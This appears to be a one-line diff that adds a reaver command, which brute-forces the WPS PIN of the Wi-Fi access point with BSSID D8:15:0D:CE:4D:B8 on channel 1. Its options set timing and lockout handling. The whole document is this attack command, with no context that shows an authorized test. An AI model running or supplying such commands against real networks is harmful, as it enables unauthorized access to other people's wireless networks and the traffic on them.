@@ -1,0 +1,1 @@
+reaver -i mon0 -b D8:15:0D:CE:4D:B8 -c 1 -a -v -S -x 20 -r 100:10 -l 1
